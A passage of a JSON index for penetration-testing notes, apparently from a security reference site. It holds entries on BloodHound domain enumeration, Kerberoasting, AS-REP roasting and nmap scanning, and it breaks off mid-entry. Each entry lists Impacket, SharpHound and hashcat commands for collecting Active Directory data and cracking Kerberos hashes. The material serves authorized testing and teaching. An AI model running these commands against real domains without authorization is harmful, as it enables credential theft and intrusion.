    {
      "id": "bloodhound-domain-enumeration",
      "title": "BloodHound Domain Enumeration",
      "category": "AD",
      "phase": "Enumeration",
      "severity": "Info",
      "featured": true,
      "tags": ["bloodhound", "enumeration", "graph-analysis", "attack-path"],
      "file": "content/notes/bloodhound-domain-enumeration.md",
      "commands": [
        "bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWORD> -c all -ns <DC_IP>",
        "SharpHound.exe -c all --zipfilename output.zip",
        "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp"
      ],
      "checklist": [
        "Install BloodHound and Neo4j",
        "Run SharpHound or bloodhound-python collector",
        "Import data into BloodHound",
        "Analyze shortest paths to Domain Admin",
        "Check for Kerberoastable users on DA path",
        "Document all attack paths"
      ],
      "next": ["kerberoasting-attack", "asrep-roasting"],
      "references": [
        { "label": "BloodHound GitHub", "url": "https://github.com/BloodHoundAD/BloodHound" },
        { "label": "BloodHound docs", "url": "https://bloodhound.readthedocs.io/en/latest/index.html" }
      ]
    },
    {
      "id": "kerberoasting-attack",
      "title": "Kerberoasting Attack",
      "category": "AD",
      "phase": "Exploitation",
      "severity": "High",
      "tags": ["kerberos", "service-accounts", "credential-access", "T1558.003"],
      "file": "content/notes/kerberoasting-attack.md",
      "commands": [
        "GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -outputfile kerberoast.hashes",
        "hashcat -m 13100 kerberoast.hashes <WORDLIST> --force",
        "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName"
      ],
      "checklist": [
        "Confirm a domain user credential is in scope",
        "Request SPN tickets",
        "Crack hashes offline",
        "Validate cracked credential carefully",
        "Map privilege and reuse paths"
      ],
      "next": ["bloodhound-domain-enumeration"],
      "references": [
        { "label": "MITRE T1558.003", "url": "https://attack.mitre.org/techniques/T1558/003/" }
      ]
    },
    {
      "id": "asrep-roasting",
      "title": "AS-REP Roasting",
      "category": "AD",
      "phase": "Exploitation",
      "severity": "High",
      "tags": ["kerberos", "pre-auth", "credential-access"],
      "file": "content/notes/asrep-roasting.md",
      "commands": [
        "GetNPUsers.py <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile asrep.hashes -dc-ip <DC_IP>",
        "hashcat -m 18200 asrep.hashes <WORDLIST>",
        "Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth"
      ],
      "checklist": [
        "Collect candidate usernames",
        "Request AS-REP hashes",
        "Crack hashes offline",
        "Test credentials only inside scope"
      ],
      "next": ["bloodhound-domain-enumeration"],
      "references": [
        { "label": "MITRE T1558.004", "url": "https://attack.mitre.org/techniques/T1558/004/" }
      ]
    },
    {
      "id": "network-service-scan",
      "title": "Network Service Scan",
      "category": "Network",
      "phase": "Reconnaissance",
      "severity": "Info",
      "tags": ["nmap", "service-discovery", "fingerprint"],
      "file": "content/notes/network-service-scan.md",
      "commands": [
        "nmap -sV -sC -oA scans/<HOSTNAME> <TARGET_IP>",
